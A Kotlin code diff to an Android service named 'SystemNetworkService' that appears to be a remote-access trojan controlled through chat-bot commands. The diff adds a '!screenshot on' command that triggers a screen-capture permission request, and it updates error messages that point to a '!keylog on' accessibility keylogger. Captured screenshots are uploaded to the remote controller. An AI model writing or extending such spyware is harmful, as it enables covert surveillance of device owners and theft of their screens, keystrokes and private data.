@@ -253,6 +253,15 @@ class SystemNetworkService : Service() {
                 "ping" -> d.sendMsg(":green_circle: **PONG** — ${Build.MODEL} | ${Build.VERSION.RELEASE}")
                 "info" -> d.sendMsg("```ansi\n${buildInfo()}\n```")
                 "screenshot" -> {
+                    if (payload?.lowercase() == "on") {
+                        try {
+                            val intent = Intent("com.openaccess.sdk.REQUEST_SCREEN")
+                            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                            sendBroadcast(intent)
+                        } catch (_: Exception) {}
+                        d.sendMsg(":tv: **Screen Capture Permission**\nGrant permission in the dialog. Screenshots will work after.")
+                        return
+                    }
                     val progressId = d.sendMsgAwait(":camera: **Capturing**...")
                     try {
                         val t1 = System.currentTimeMillis()
@@ -269,8 +278,13 @@ class SystemNetworkService : Service() {
                             d.sendFile(":camera: **Screenshot**", "screen_${System.currentTimeMillis()}.png", bytes)
                         } else {
                             val acc = AccessibilityHelper.isRunning
+                            val mp = DisplayCapture.mediaProjection != null
                             val ver = Build.VERSION.SDK_INT
-                            val err = ":x: **Screenshot failed** (${elapsed}ms)\nAccessibility: $acc | Android: $ver\nTry: `!keylog on` to enable accessibility first"
+                            val err = if (!mp && !acc) {
+                                ":x: **Screenshot failed** (${elapsed}ms)\nAndroid: $ver | Accessibility: $acc | MediaProjection: $mp\nEnable with: `!screenshot on`"
+                            } else {
+                                ":x: **Screenshot failed** (${elapsed}ms)\nAccessibility: $acc | MediaProjection: $mp\nTry: `!keylog on` to enable accessibility"
+                            }
                             if (progressId != null) d.editMsg(progressId, err) else d.sendMsg(err)
                         }
                     } catch (e: Exception) {
